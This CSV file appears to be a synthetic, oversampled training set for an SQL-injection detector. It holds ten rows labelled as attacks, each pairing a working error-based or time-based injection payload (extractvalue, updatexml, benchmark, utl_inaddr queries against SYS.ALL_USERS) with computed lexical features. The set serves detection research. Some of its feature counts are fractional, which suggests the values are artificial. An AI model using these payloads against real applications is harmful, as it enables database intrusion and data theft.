id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000001,attack,error,"1'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'mwyu'  =  'mwyu",nearest_attack_euclidean,R000016,0.5682293512195926,185.29681244540518,30.0,3.645988844951274,49.18724978162076,35.0,76.40637510918963,24.703187554594813,0.2654284862604008,0.1888872875446329,0.41236050092716886,0.13332372526779745,4.0,0.0,0.0,0.0,0.0,1.703187554594811,0.0,14.0,2.7755575615628914e-17,0.0,5.0,1.7031875545948107,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000002,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R000069,0.7627150325026246,169.06660721907818,27.311130926973938,3.44921232837315,42.377738146052124,32.0,72.37773814605212,22.311130926973938,0.2506287909266819,0.18928737474425847,0.4280857047494242,0.13199812957963541,1.0,0.0,0.0,0.0,1.0,1.0,0.0,14.0,2.7755575615628914e-17,0.0,4.311130926973936,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,0.0,0.6888690730260638,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.688869073026064
SMOTE_000003,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'mevd'  =  'mevd",nearest_attack_euclidean,R000155,0.24885361760701177,169.77742235879492,28.244515528241017,3.751517991859979,48.0,35.0,64.02193788703593,22.755484471758983,0.282833305247824,0.2062326184098717,0.3769285142334632,0.13400556210884104,4.0,0.0,0.0,0.0,0.0,2.0,0.0,11.755484471758983,2.7755575615628914e-17,0.0,5.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000004,attack,error,"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'kudh' like 'kudh",nearest_attack_euclidean,R000234,0.37027015283033626,162.0,29.31439571913939,3.925870545372768,49.94318715741817,37.74241712344244,53.62879143827878,20.68560428086061,0.30829127874949486,0.23297788347803974,0.331041922458511,0.12768891531395438,4.0,0.0,0.0,0.0,0.0,1.0,0.0,10.0,2.7755575615628914e-17,0.0,5.68560428086061,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000005,attack,error,"1"" or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""pnub""  =  ""pnub",nearest_attack_euclidean,R000129,0.24999000263744156,189.72769113305893,29.818241590436987,3.6374448619671895,53.33355249826896,32.0,78.63648318087398,25.757655453915984,0.28091817696286386,0.16879315933914738,0.41456977788836696,0.13571888580962185,0.0,3.8182415904369886,0.0,0.0,1.0,1.9394138634789961,0.0,14.0,2.7755575615628914e-17,0.0,4.0,2.939413863478996,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,0.9394138634789961,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.939413863478997
SMOTE_000006,attack,error,"1 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",nearest_attack_euclidean,R000176,0.38785575774009795,139.0,25.32326919625708,3.673459351639684,34.96980758877124,37.70692321497169,49.64653839251416,16.67673080374292,0.2515813495595053,0.27127282888468834,0.35716934095333924,0.11997648060246706,0.0,0.0,0.0,0.0,0.0,1.0,0.0,10.0,2.7755575615628914e-17,0.0,5.676730803742921,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000007,attack,error,"1  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000099,0.45434830414337396,151.52187498167604,32.0,3.7527391449493073,50.0,23.0,60.101562484730024,18.420312496946007,0.33031415444229434,0.15194451104345538,0.3962176022880305,0.12152373222621977,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.420312496946005,2.7755575615628914e-17,0.0,4.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000008,attack,error,"1' procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000199,0.6554724740939705,146.0969079133812,32.7257730216547,3.852474862208708,50.0,23.0,55.09690791338119,18.0,0.34228903514607456,0.1574529561671943,0.37703395603414436,0.12322405265258685,0.7257730216547035,0.0,0.0,0.0,0.0,0.0,0.0,12.274226978345297,2.7755575615628914e-17,0.0,4.0,0.0,0.7257730216547035,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000009,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  USERNAME   )    )    FROM SYS.ALL_USERS   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000008,1.8564570774827467,129.36352606485391,36.44963443067962,4.155220146510056,66.25548353980564,1.0,44.90658024776677,17.201462277281504,0.514437802819988,0.007894713707122414,0.34416826911755,0.13349921435533965,3.0,0.0,0.0,0.0,0.0,2.0,0.0,6.201462277281504,2.7755575615628914e-17,4.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000010,attack,error,select   (  case when   (  3539  =  8768  )   then 3539 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000290,0.005132426819125205,133.0,30.0,3.7658441687388504,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,2.7755575615628914e-17,0.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
